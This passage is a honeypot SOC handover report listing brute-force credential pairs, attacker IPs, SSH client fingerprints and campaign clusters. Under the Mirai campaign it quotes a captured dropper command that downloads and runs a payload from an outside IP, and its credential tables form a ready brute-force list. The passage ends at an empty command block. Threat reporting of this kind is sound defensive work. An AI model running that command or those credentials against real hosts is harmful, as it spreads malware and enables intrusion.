# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-15 |
| **Generated At** | 2026-08-15T22:27:32Z |
| **Shift Time** | 22:27 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **5708** |
| Confirmed Threats | **5679** |
| False Positives Filtered | **29** (0.5%) |
| Unique Attacker IPs | **94** |
| Countries of Origin | **35** |
| High Severity Cases | **310** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **5398** |
| Malware Samples Analyzed | **2** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **338** |
| Unique Credential Pairs | **284** |
| Unique Usernames | **93** |
| Unique Passwords | **202** |
| Successful Auth Pairs | **323** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 42 |
| `admin` | 27 |
| `debian` | 19 |
| `user` | 15 |
| `config` | 13 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `password` | 13 |
| `qwerty1` | 11 |
| `1q2w3e4r` | 10 |
| `qwerty` | 8 |
| `123456` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `nobody` | `1q2w3e4r` | 6 |
| `Admin` | `1q2w3e4r5t` | 6 |
| `config` | `qwerty1` | 6 |
| `config` | `password` | 6 |
| `support` | `987654321` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root2026` | `195.178.110.228` | 2026-08-15T18:56:47 |
| `root` | `welcome` | `195.178.110.228` | 2026-08-15T18:58:36 |
| `debian` | `123123` | `197.242.170.10` | 2026-08-15T18:59:02 |
| `debian` | `123123` | `113.108.88.121` | 2026-08-15T18:59:12 |
| `support` | `987654321` | `10.0.0.73` | 2026-08-15T19:00:14 |
| `admin` | `123456` | `195.178.110.228` | 2026-08-15T19:00:28 |
| `support` | `987654321` | `124.67.120.106` | 2026-08-15T19:01:50 |
| `support` | `987654321` | `213.55.79.195` | 2026-08-15T19:02:01 |
| `admin` | `123qwe` | `195.178.110.228` | 2026-08-15T19:02:31 |
| `root` | `﻿------fuck------` | `111.42.60.82` | 2026-08-15T19:02:45 |
| `nobody` | `1q2w3e4r` | `114.98.63.18` | 2026-08-15T19:04:07 |
| `nobody` | `1q2w3e4r` | `62.182.132.94` | 2026-08-15T19:04:16 |
| `admin` | `123qwerty` | `195.178.110.228` | 2026-08-15T19:04:22 |
| `admin` | `21` | `195.178.110.228` | 2026-08-15T19:06:06 |
| `support` | `support` | `10.0.0.73` | 2026-08-15T19:06:43 |
| `admin` | `321` | `195.178.110.228` | 2026-08-15T19:07:45 |
| `admin` | `654321` | `195.178.110.228` | 2026-08-15T19:09:25 |
| `admin` | `P@ssw0rd` | `195.178.110.228` | 2026-08-15T19:11:04 |
| `admin` | `Password` | `195.178.110.228` | 2026-08-15T19:12:45 |
| `root` | `qq123456` | `217.165.22.192` | 2026-08-15T19:13:52 |
| `admin` | `admin` | `195.178.110.228` | 2026-08-15T19:14:28 |
| `nobody` | `1q2w3e4r` | `10.0.0.73` | 2026-08-15T19:15:26 |
| `ubuntu` | `12` | `185.74.59.14` | 2026-08-15T19:15:53 |
| `admin` | `admin12` | `195.178.110.228` | 2026-08-15T19:16:14 |
| `root` | `Root@1234` | `45.142.193.164` | 2026-08-15T19:17:06 |
| `support` | `987654321` | `182.60.128.241` | 2026-08-15T19:17:30 |
| `support` | `987654321` | `36.154.134.146` | 2026-08-15T19:17:39 |
| `root` | `1qaz@WSX3edc$RFV5tgb` | `15.235.192.186` | 2026-08-15T19:17:52 |
| `345gs5662d34` | `345gs5662d34` | `15.235.192.186` | 2026-08-15T19:17:56 |
| `root` | `3245gs5662d34` | `15.235.192.186` | 2026-08-15T19:17:58 |
| `admin` | `admin123` | `195.178.110.228` | 2026-08-15T19:18:01 |
| `admin` | `admin2026` | `195.178.110.228` | 2026-08-15T19:19:53 |
| `admin` | `letmein` | `195.178.110.228` | 2026-08-15T19:21:46 |
| `Admin` | `1q2w3e4r5t` | `10.0.0.73` | 2026-08-15T19:21:48 |
| `admin` | `pa$w0rd` | `195.178.110.228` | 2026-08-15T19:23:40 |
| `admin` | `passw0rd` | `195.178.110.228` | 2026-08-15T19:25:23 |
| `admin` | `password` | `195.178.110.228` | 2026-08-15T19:27:01 |
| `ubuntu` | `123` | `185.74.59.14` | 2026-08-15T19:28:26 |
| `admin` | `qwerty` | `195.178.110.228` | 2026-08-15T19:28:41 |
| `administrator` | `123456` | `195.178.110.228` | 2026-08-15T19:30:30 |
| `administrator` | `P@ssw0rd` | `195.178.110.228` | 2026-08-15T19:32:19 |
| `nobody` | `1q2w3e4r` | `65.20.202.4` | 2026-08-15T19:32:39 |
| `nobody` | `1q2w3e4r` | `123.129.245.249` | 2026-08-15T19:32:48 |
| `root` | `Password01!` | `217.165.22.192` | 2026-08-15T19:33:00 |
| `config` | `qwerty1` | `10.0.0.73` | 2026-08-15T19:33:38 |
| `administrator` | `administrator` | `195.178.110.228` | 2026-08-15T19:34:10 |
| `config` | `qwerty1` | `195.218.159.123` | 2026-08-15T19:35:09 |
| `config` | `qwerty1` | `178.132.144.161` | 2026-08-15T19:35:16 |
| `administrator` | `administrator123` | `195.178.110.228` | 2026-08-15T19:36:00 |
| `support` | `support` | `176.53.159.196` | 2026-08-15T19:37:37 |
| `debian` | `qwerty1` | `200.37.179.83` | 2026-08-15T19:37:40 |
| `administrator` | `passw0rd` | `195.178.110.228` | 2026-08-15T19:37:43 |
| `debian` | `qwerty1` | `92.255.196.185` | 2026-08-15T19:37:48 |
| `root` | `public` | `223.197.153.143` | 2026-08-15T19:38:22 |
| `root` | `public` | `175.206.1.60` | 2026-08-15T19:38:31 |
| `administrator` | `password` | `195.178.110.228` | 2026-08-15T19:39:22 |
| `root` | `!QAZ2wsx#EDC` | `45.142.193.164` | 2026-08-15T19:39:38 |
| `Admin` | `1q2w3e4r5t` | `178.178.222.58` | 2026-08-15T19:39:57 |
| `Admin` | `1q2w3e4r5t` | `65.20.141.202` | 2026-08-15T19:40:05 |
| `Admin` | `1q2w3e4r5t` | `186.179.80.12` | 2026-08-15T19:40:12 |
| `Admin` | `1q2w3e4r5t` | `117.158.160.42` | 2026-08-15T19:40:27 |
| `ansible` | `123456` | `195.178.110.228` | 2026-08-15T19:41:04 |
| `ansible` | `ansible` | `195.178.110.228` | 2026-08-15T19:42:50 |
| `ansible` | `ansible123` | `195.178.110.228` | 2026-08-15T19:44:33 |
| `user3` | `1234` | `45.198.224.26` | 2026-08-15T19:45:36 |
| `ansible` | `passw0rd` | `195.178.110.228` | 2026-08-15T19:46:13 |
| `ansible` | `password` | `195.178.110.228` | 2026-08-15T19:47:48 |
| `debian` | `qwerty1` | `10.0.0.73` | 2026-08-15T19:49:08 |
| `root` | `LeitboGi0ro` | `168.110.102.254` | 2026-08-15T19:49:21 |
| `root` | `123@@@` | `168.110.102.254` | 2026-08-15T19:49:22 |
| `apache` | `P@ssw0rd` | `195.178.110.228` | 2026-08-15T19:49:31 |
| `config` | `qwerty1` | `210.245.95.11` | 2026-08-15T19:50:58 |
| `config` | `qwerty1` | `122.187.229.201` | 2026-08-15T19:51:08 |
| `apache` | `apache` | `195.178.110.228` | 2026-08-15T19:51:17 |
| `ubuntu` | `12345` | `185.74.59.14` | 2026-08-15T19:51:30 |
| `root` | `centos` | `217.165.22.192` | 2026-08-15T19:52:08 |
| `apache` | `password` | `195.178.110.228` | 2026-08-15T19:53:02 |
| `guest` | `P@ssw0rd` | `10.0.0.73` | 2026-08-15T19:53:09 |
| `backup` | `123qwe` | `195.178.110.228` | 2026-08-15T19:54:52 |
| `root` | `qwerty123` | `10.0.0.73` | 2026-08-15T19:55:31 |
| `backup` | `54321` | `195.178.110.228` | 2026-08-15T19:56:43 |
| `backup` | `backup` | `195.178.110.228` | 2026-08-15T19:58:38 |
| `support` | `147258369` | `10.0.0.73` | 2026-08-15T19:58:44 |
| `backup` | `backup12` | `195.178.110.228` | 2026-08-15T20:00:30 |
| `root` | `Admin@12` | `45.142.193.164` | 2026-08-15T20:02:17 |
| `backup` | `backup123` | `195.178.110.228` | 2026-08-15T20:02:23 |
| `backup` | `password` | `195.178.110.228` | 2026-08-15T20:04:15 |
| `debian` | `qwerty1` | `102.90.34.90` | 2026-08-15T20:05:55 |
| `backup` | `wasd` | `195.178.110.228` | 2026-08-15T20:06:10 |
| `user` | `webmaster` | `10.0.0.73` | 2026-08-15T20:07:00 |
| `centos` | `centos` | `195.178.110.228` | 2026-08-15T20:08:02 |
| `user` | `webmaster` | `122.187.229.201` | 2026-08-15T20:08:25 |
| `centos` | `centos123` | `195.178.110.228` | 2026-08-15T20:09:52 |
| `config` | `password` | `190.57.233.133` | 2026-08-15T20:11:09 |
| `root` | `centos123` | `217.165.22.192` | 2026-08-15T20:11:16 |
| `config` | `password` | `186.215.107.189` | 2026-08-15T20:11:17 |
| `debian` | `123456` | `195.178.110.228` | 2026-08-15T20:11:38 |
| `hunter` | `hunter` | `10.0.0.73` | 2026-08-15T20:12:10 |
| `trading` | `trading@123` | `91.92.40.171` | 2026-08-15T20:12:26 |
| `test` | `qwerty123456` | `91.92.40.171` | 2026-08-15T20:12:32 |
| `supervisor` | `supervisor66` | `91.92.40.171` | 2026-08-15T20:12:37 |
| `btcd` | `btcd` | `91.92.40.171` | 2026-08-15T20:12:42 |
| `hadoop` | `123qwe` | `91.92.40.171` | 2026-08-15T20:12:46 |
| `test` | `pass` | `91.92.40.171` | 2026-08-15T20:12:51 |
| `guest` | `1234567890` | `91.92.40.171` | 2026-08-15T20:12:57 |
| `hadoop` | `password123` | `91.92.40.171` | 2026-08-15T20:13:02 |
| `www-data` | `www-data` | `91.92.40.171` | 2026-08-15T20:13:07 |
| `oracle` | `password123` | `91.92.40.171` | 2026-08-15T20:13:12 |
| `miner` | `mmpOS` | `91.92.40.171` | 2026-08-15T20:13:18 |
| `hadoop` | `pass` | `91.92.40.171` | 2026-08-15T20:13:22 |
| `debian` | `123qwe` | `195.178.110.228` | 2026-08-15T20:13:27 |
| `root` | `htpcguides` | `91.92.40.171` | 2026-08-15T20:13:27 |
| `joggler` | `joggler` | `91.92.40.171` | 2026-08-15T20:13:32 |
| `oracle` | `test321` | `91.92.40.171` | 2026-08-15T20:13:38 |
| `nginx` | `password` | `91.92.40.171` | 2026-08-15T20:13:42 |
| `root` | `qwerty123` | `103.29.185.162` | 2026-08-15T20:13:47 |
| `pi` | `qwerty` | `91.92.40.171` | 2026-08-15T20:13:48 |
| `git` | `qwer1234` | `91.92.40.171` | 2026-08-15T20:13:53 |
| `root` | `qwerty123` | `61.12.84.172` | 2026-08-15T20:13:57 |
| `root` | `ibkr` | `91.92.40.171` | 2026-08-15T20:13:58 |
| `root` | `!@#$QWER1234` | `91.92.40.171` | 2026-08-15T20:14:04 |
| `hadoop` | `passpass` | `91.92.40.171` | 2026-08-15T20:14:09 |
| `guest` | `guestpass` | `91.92.40.171` | 2026-08-15T20:14:15 |
| `postgres` | `passwd` | `91.92.40.171` | 2026-08-15T20:14:20 |
| `admin` | `07051982` | `91.92.40.171` | 2026-08-15T20:14:25 |
| `hadoop` | `321123` | `91.92.40.171` | 2026-08-15T20:14:30 |
| `git` | `p@ssw0rd` | `91.92.40.171` | 2026-08-15T20:14:35 |
| `defi` | `defi` | `91.92.40.171` | 2026-08-15T20:14:41 |
| `user` | `123321` | `91.92.40.171` | 2026-08-15T20:14:46 |
| `broker` | `trader` | `91.92.40.171` | 2026-08-15T20:14:51 |
| `admin` | `qwertyuiop` | `91.92.40.171` | 2026-08-15T20:14:56 |
| `ts3` | `qwerty` | `91.92.40.171` | 2026-08-15T20:15:02 |
| `office` | `office` | `91.92.40.171` | 2026-08-15T20:15:07 |
| `oracle` | `wasd` | `91.92.40.171` | 2026-08-15T20:15:12 |
| `debian` | `54321` | `195.178.110.228` | 2026-08-15T20:15:17 |
| `dirk` | `dirk` | `91.92.40.171` | 2026-08-15T20:15:18 |
| `root` | `softbiz4` | `91.92.40.171` | 2026-08-15T20:15:23 |
| `user` | `userpass` | `91.92.40.171` | 2026-08-15T20:15:28 |
| `git` | `1q2w3e` | `91.92.40.171` | 2026-08-15T20:15:34 |
| `jenkins` | `admin` | `91.92.40.171` | 2026-08-15T20:15:39 |
| `oracle` | `pass1234` | `91.92.40.171` | 2026-08-15T20:15:44 |
| `oracle` | `oracle@2022` | `91.92.40.171` | 2026-08-15T20:15:49 |
| `postgres` | `321123` | `91.92.40.171` | 2026-08-15T20:15:55 |
| `adam` | `adam` | `91.92.40.171` | 2026-08-15T20:16:00 |
| `operator` | `password` | `91.92.40.171` | 2026-08-15T20:16:06 |
| `kurtosis` | `kurtosis` | `91.92.40.171` | 2026-08-15T20:16:11 |
| `git` | `pass` | `91.92.40.171` | 2026-08-15T20:16:16 |
| `miner` | `miner` | `91.92.40.171` | 2026-08-15T20:16:21 |
| `jira` | `jira` | `91.92.40.171` | 2026-08-15T20:16:26 |
| `nginx` | `admin` | `91.92.40.171` | 2026-08-15T20:16:31 |
| `oracle` | `qwer1234` | `91.92.40.171` | 2026-08-15T20:16:37 |
| `postgres` | `pass` | `91.92.40.171` | 2026-08-15T20:16:42 |
| `root` | `as123456.` | `91.92.40.171` | 2026-08-15T20:16:47 |
| `hadoop` | `654321` | `91.92.40.171` | 2026-08-15T20:16:52 |
| `bank` | `bank` | `91.92.40.171` | 2026-08-15T20:16:58 |
| `sol` | `test` | `91.92.40.171` | 2026-08-15T20:17:02 |
| `debian` | `654321` | `195.178.110.228` | 2026-08-15T20:17:03 |
| `ibkr` | `ibkr` | `91.92.40.171` | 2026-08-15T20:17:07 |
| `test` | `pass1234` | `91.92.40.171` | 2026-08-15T20:17:13 |
| `bin` | `bin` | `91.92.40.171` | 2026-08-15T20:17:18 |
| `test` | `123abc` | `91.92.40.171` | 2026-08-15T20:17:23 |
| `grandine` | `grandine` | `91.92.40.171` | 2026-08-15T20:17:28 |
| `user` | `passpass` | `91.92.40.171` | 2026-08-15T20:17:33 |
| `supervisor` | `12345678` | `91.92.40.171` | 2026-08-15T20:17:38 |
| `oracle` | `passpass` | `91.92.40.171` | 2026-08-15T20:17:43 |
| `shardeum` | `shardeum` | `91.92.40.171` | 2026-08-15T20:17:48 |
| `support` | `951951` | `91.92.40.171` | 2026-08-15T20:17:54 |
| `guest` | `Guest123` | `91.92.40.171` | 2026-08-15T20:17:59 |
| `postgres` | `1q2w3e4r` | `91.92.40.171` | 2026-08-15T20:18:04 |
| `hadoop` | `1q2w3e` | `91.92.40.171` | 2026-08-15T20:18:09 |
| `pi` | `1q2w3e4r` | `91.92.40.171` | 2026-08-15T20:18:14 |
| `hadoop` | `wasd` | `91.92.40.171` | 2026-08-15T20:18:20 |
| `solana123` | `solana123` | `91.92.40.171` | 2026-08-15T20:18:25 |
| `test` | `test111` | `91.92.40.171` | 2026-08-15T20:18:30 |
| `hadoop` | `1q2w3e4r` | `91.92.40.171` | 2026-08-15T20:18:35 |
| `pi` | `rasp` | `91.92.40.171` | 2026-08-15T20:18:40 |
| `oracle` | `654321` | `91.92.40.171` | 2026-08-15T20:18:45 |
| `test` | `q1w2e3r4` | `91.92.40.171` | 2026-08-15T20:18:51 |
| `debian` | `debian` | `195.178.110.228` | 2026-08-15T20:18:53 |
| `supervisor` | `supervisor000` | `91.92.40.171` | 2026-08-15T20:18:56 |
| `ts3` | `teamspeak3` | `91.92.40.171` | 2026-08-15T20:19:01 |
| `user` | `P@ssw0rd` | `91.92.40.171` | 2026-08-15T20:19:07 |
| `user` | `letmein` | `91.92.40.171` | 2026-08-15T20:19:12 |
| `sina` | `sina` | `91.92.40.171` | 2026-08-15T20:19:17 |
| `guest` | `159753` | `91.92.40.171` | 2026-08-15T20:19:22 |
| `test` | `wasd` | `91.92.40.171` | 2026-08-15T20:19:27 |
| `postgres` | `321` | `91.92.40.171` | 2026-08-15T20:19:33 |
| `guest` | `guest@123` | `91.92.40.171` | 2026-08-15T20:19:38 |
| `root` | `888` | `91.92.40.171` | 2026-08-15T20:19:43 |
| `admin` | `andrew` | `91.92.40.171` | 2026-08-15T20:19:49 |
| `admin` | `07021992` | `91.92.40.171` | 2026-08-15T20:19:53 |
| `nginx` | `welcome` | `91.92.40.171` | 2026-08-15T20:19:59 |
| `test` | `321` | `91.92.40.171` | 2026-08-15T20:20:04 |
| `nginx` | `nginx@123` | `91.92.40.171` | 2026-08-15T20:20:09 |
| `pi` | `raspberrypi` | `91.92.40.171` | 2026-08-15T20:20:15 |
| `user` | `admin123` | `91.92.40.171` | 2026-08-15T20:20:20 |
| `root` | `55555555` | `91.92.40.171` | 2026-08-15T20:20:25 |
| `git` | `github` | `91.92.40.171` | 2026-08-15T20:20:30 |
| `sol123` | `sol123` | `91.92.40.171` | 2026-08-15T20:20:36 |
| `yuanwd` | `yuanwd` | `91.92.40.171` | 2026-08-15T20:20:41 |
| `gissell` | `gissell` | `91.92.40.171` | 2026-08-15T20:20:46 |
| `rftest` | `rftest` | `91.92.40.171` | 2026-08-15T20:20:51 |
| `ubuntu` | `ubuntu1` | `91.92.40.171` | 2026-08-15T20:20:56 |
| `root` | `root444` | `91.92.40.171` | 2026-08-15T20:21:01 |
| `Support` | `abcd1234` | `91.92.40.171` | 2026-08-15T20:21:06 |
| `jenkins` | `deploy` | `91.92.40.171` | 2026-08-15T20:21:11 |
| `git` | `321123` | `91.92.40.171` | 2026-08-15T20:21:16 |
| `user` | `pass1234` | `91.92.40.171` | 2026-08-15T20:21:21 |
| `config` | `config7` | `91.92.40.171` | 2026-08-15T20:21:26 |
| `oracle` | `123321` | `91.92.40.171` | 2026-08-15T20:21:31 |
| `test` | `Test123` | `91.92.40.171` | 2026-08-15T20:21:37 |
| `debian` | `temppwd` | `91.92.40.171` | 2026-08-15T20:21:42 |
| `wpyan` | `wpyan` | `91.92.40.171` | 2026-08-15T20:21:47 |
| `ollama` | `ollama` | `91.92.40.171` | 2026-08-15T20:21:52 |
| `tooncity` | `tooncity` | `91.92.40.171` | 2026-08-15T20:21:57 |
| `admin` | `04031988` | `91.92.40.171` | 2026-08-15T20:22:02 |
| `pi` | `admin123` | `91.92.40.171` | 2026-08-15T20:22:07 |
| `ubuntu` | `1qaz2wsx` | `91.92.40.171` | 2026-08-15T20:22:13 |
| `elrond` | `elrond` | `91.92.40.171` | 2026-08-15T20:22:18 |
| `git` | `123qwe` | `91.92.40.171` | 2026-08-15T20:22:23 |
| `siren` | `siren` | `91.92.40.171` | 2026-08-15T20:22:28 |
| `git` | `pass1234` | `91.92.40.171` | 2026-08-15T20:22:33 |
| `admin` | `welcome` | `91.92.40.171` | 2026-08-15T20:22:39 |
| `config` | `password` | `10.0.0.73` | 2026-08-15T20:22:41 |
| `ubuntu` | `Ubuntu123` | `91.92.40.171` | 2026-08-15T20:22:45 |
| `user` | `11q2w3e4r5t` | `91.92.40.171` | 2026-08-15T20:22:51 |
| `annalee` | `annalee` | `91.92.40.171` | 2026-08-15T20:22:56 |
| `stereum` | `stereum` | `91.92.40.171` | 2026-08-15T20:23:01 |
| `codex` | `codex` | `91.92.40.171` | 2026-08-15T20:23:06 |
| `default` | `passw0rd` | `91.92.40.171` | 2026-08-15T20:23:12 |
| `root` | `qwer@1234` | `91.92.40.171` | 2026-08-15T20:23:17 |
| `tensor` | `tensor` | `91.92.40.171` | 2026-08-15T20:23:23 |
| `minecraft` | `server` | `91.92.40.171` | 2026-08-15T20:23:28 |
| `postgres` | `qwer1234` | `91.92.40.171` | 2026-08-15T20:23:32 |
| `prysm` | `prysm` | `91.92.40.171` | 2026-08-15T20:23:38 |
| `chassidy` | `chassidy` | `91.92.40.171` | 2026-08-15T20:23:43 |
| `teku` | `teku` | `91.92.40.171` | 2026-08-15T20:23:48 |
| `ftp` | `admin` | `91.92.40.171` | 2026-08-15T20:23:53 |
| `root` | `explorer` | `91.92.40.171` | 2026-08-15T20:23:58 |
| `web3signer` | `web3signer` | `91.92.40.171` | 2026-08-15T20:24:03 |
| `root` | `validator` | `91.92.40.171` | 2026-08-15T20:24:08 |
| `operator` | `operator1234567890` | `91.92.40.171` | 2026-08-15T20:24:14 |
| `firedancer` | `firedancer1!` | `91.92.40.171` | 2026-08-15T20:24:20 |
| `user` | `webmaster` | `182.79.218.101` | 2026-08-15T20:24:23 |
| `geth` | `geth` | `91.92.40.171` | 2026-08-15T20:24:25 |
| `user` | `webmaster` | `63.135.169.175` | 2026-08-15T20:24:29 |
| `postgres` | `pass1234` | `91.92.40.171` | 2026-08-15T20:24:30 |
| `asya` | `asya` | `91.92.40.171` | 2026-08-15T20:24:35 |
| `oracle` | `Oracle123` | `91.92.40.171` | 2026-08-15T20:24:40 |
| `root` | `Yy123456` | `45.142.193.164` | 2026-08-15T20:24:42 |
| `admin` | `power` | `91.92.40.171` | 2026-08-15T20:24:46 |
| `ts3` | `Ts3123` | `91.92.40.171` | 2026-08-15T20:24:51 |
| `guest` | `1q2w3e4r` | `91.92.40.171` | 2026-08-15T20:24:56 |
| `oracle` | `321123` | `91.92.40.171` | 2026-08-15T20:25:01 |
| `git` | `wasd` | `91.92.40.171` | 2026-08-15T20:25:07 |
| `user` | `ghbdtn` | `91.92.40.171` | 2026-08-15T20:25:12 |
| `admin` | `04011984` | `91.92.40.171` | 2026-08-15T20:25:17 |
| `silkworm` | `silkworm` | `91.92.40.171` | 2026-08-15T20:25:22 |
| `vagrant` | `123456` | `91.92.40.171` | 2026-08-15T20:25:27 |
| `guest` | `1234` | `91.92.40.171` | 2026-08-15T20:25:32 |
| `hadoop` | `1234qwer` | `91.92.40.171` | 2026-08-15T20:25:38 |
| `user` | `123abc` | `91.92.40.171` | 2026-08-15T20:25:43 |
| `root` | `1qq2w3e4r5t` | `91.92.40.171` | 2026-08-15T20:25:49 |
| `cadami` | `cadami` | `91.92.40.171` | 2026-08-15T20:25:53 |
| `deploy` | `deploy@2025` | `91.92.40.171` | 2026-08-15T20:25:59 |
| `root` | `calvin` | `91.92.40.171` | 2026-08-15T20:26:04 |
| `besu` | `besu` | `91.92.40.171` | 2026-08-15T20:26:09 |
| `guest` | `123abc` | `91.92.40.171` | 2026-08-15T20:26:14 |
| `hadoop` | `111111` | `91.92.40.171` | 2026-08-15T20:26:20 |
| `admin` | `adminroot` | `91.92.40.171` | 2026-08-15T20:26:25 |
| `library` | `library` | `91.92.40.171` | 2026-08-15T20:26:31 |
| `sol` | `solana` | `91.92.40.171` | 2026-08-15T20:26:35 |
| `test3` | `test3` | `91.92.40.171` | 2026-08-15T20:26:40 |
| `postgres` | `123321` | `91.92.40.171` | 2026-08-15T20:26:46 |
| `postgres` | `password1` | `91.92.40.171` | 2026-08-15T20:26:51 |
| `sol` | `Solana` | `91.92.40.171` | 2026-08-15T20:26:56 |
| `apache` | `qwerty` | `91.92.40.171` | 2026-08-15T20:27:01 |
| `lodestar` | `lodestar` | `91.92.40.171` | 2026-08-15T20:27:07 |
| `guest` | `qwerty` | `91.92.40.171` | 2026-08-15T20:27:12 |
| `ubuntu` | `123123` | `185.74.59.14` | 2026-08-15T20:27:14 |
| `supervisor` | `supervisor44` | `91.92.40.171` | 2026-08-15T20:27:17 |
| `default` | `raspberry` | `91.92.40.171` | 2026-08-15T20:27:22 |
| `hadoop` | `qwerty` | `91.92.40.171` | 2026-08-15T20:27:27 |
| `zhouh` | `zhouh` | `91.92.40.171` | 2026-08-15T20:27:32 |
| `trader` | `broker` | `91.92.40.171` | 2026-08-15T20:27:38 |
| `solana` | `Solana1!` | `91.92.40.171` | 2026-08-15T20:27:42 |
| `git` | `321` | `91.92.40.171` | 2026-08-15T20:27:47 |
| `frappe` | `123456` | `91.92.40.171` | 2026-08-15T20:27:53 |
| `ari` | `ari` | `91.92.40.171` | 2026-08-15T20:27:58 |
| `bitcoind` | `bitcoind` | `91.92.40.171` | 2026-08-15T20:28:03 |
| `minecraft` | `qwerty` | `91.92.40.171` | 2026-08-15T20:28:08 |
| `commit-boost` | `commit-boost` | `91.92.40.171` | 2026-08-15T20:28:13 |
| `root` | `broker` | `91.92.40.171` | 2026-08-15T20:28:18 |
| `postgres` | `qwerty` | `91.92.40.171` | 2026-08-15T20:28:24 |
| `oracle` | `1234qwer` | `91.92.40.171` | 2026-08-15T20:28:29 |
| `supervisor` | `3333333` | `91.92.40.171` | 2026-08-15T20:28:34 |
| `admin` | `09021981` | `91.92.40.171` | 2026-08-15T20:28:39 |
| `ubuntu` | `ubuntu@123` | `91.92.40.171` | 2026-08-15T20:28:44 |
| `ts3` | `ts3server` | `91.92.40.171` | 2026-08-15T20:28:49 |
| `test` | `webadmin` | `10.0.0.73` | 2026-08-15T20:28:53 |
| `root` | `!QAZ2wsx#EDC` | `217.165.22.192` | 2026-08-15T20:30:23 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `35.203.211.217` | 2026-08-15T20:34:04 |
| `config` | `password` | `121.202.206.119` | 2026-08-15T20:39:28 |
| `config` | `password` | `45.178.227.0` | 2026-08-15T20:39:37 |
| `debian` | `Passw@rd` | `10.0.0.73` | 2026-08-15T20:40:16 |
| `debian` | `Passw@rd` | `24.97.253.246` | 2026-08-15T20:41:53 |
| `debian` | `Passw@rd` | `186.239.41.74` | 2026-08-15T20:42:04 |
| `debian` | `77` | `116.48.150.115` | 2026-08-15T20:44:27 |
| `debian` | `77` | `103.111.6.121` | 2026-08-15T20:44:35 |
| `sol` | `sol` | `2.57.122.238` | 2026-08-15T20:45:38 |
| `test` | `webadmin` | `116.7.248.50` | 2026-08-15T20:47:02 |
| `test` | `webadmin` | `102.38.3.107` | 2026-08-15T20:47:11 |
| `root` | `Ww123456` | `45.142.193.164` | 2026-08-15T20:47:21 |
| `solana` | `solana` | `2.57.122.238` | 2026-08-15T20:47:28 |
| `ethdocker` | `ethdocker` | `2.57.122.238` | 2026-08-15T20:49:13 |
| `root` | `........` | `217.165.22.192` | 2026-08-15T20:49:32 |
| `eth-docker` | `eth-docker` | `2.57.122.238` | 2026-08-15T20:50:56 |
| `ubuntu` | `102030` | `185.74.59.14` | 2026-08-15T20:50:57 |
| `eth_docker` | `eth_docker` | `2.57.122.238` | 2026-08-15T20:52:42 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-15T20:53:46 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-15T20:53:48 |
| `raydium` | `raydium` | `2.57.122.238` | 2026-08-15T20:54:18 |
| `operator` | `operator5` | `10.0.0.73` | 2026-08-15T20:54:39 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **5708** |
| Sessions with Fingerprint | **16** |
| Unique HASSH Fingerprints | **16** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 267 |
| OpenSSH | 38 |
| libssh | 11 |
| Paramiko (Python) | 6 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 190 | 1 |
| `2ec37a7cc8da...` | Mirai/variant | 47 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 38 | 37 |
| `98ddc5604ef6...` | Modern SSH client | 10 | 2 |
| `e45f2d6d7f79...` | Mirai/variant | 6 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 190 | 1 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 47 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 38 | 37 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 10 | 2 | Modern SSH client |
| `95420f9d932d...` | libssh | 8 | 3 | — |
| `e45f2d6d7f79...` | Go SSH scanner | 6 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 6 | 1 | Generic scanner |
| `6372ee695756...` | Paramiko (Python) | 4 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **9** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1070, T1140, T1059.004` |
| **Recon Loader Script** | 🟡 MEDIUM | 47 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
```
```
cd /tmp
```
```
wget http://5.182.210.174/ok
```
```
curl -O http://5.182.210.174/ok
```
```
chmod +x ok
```
Source IPs: `45.198.224.26`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
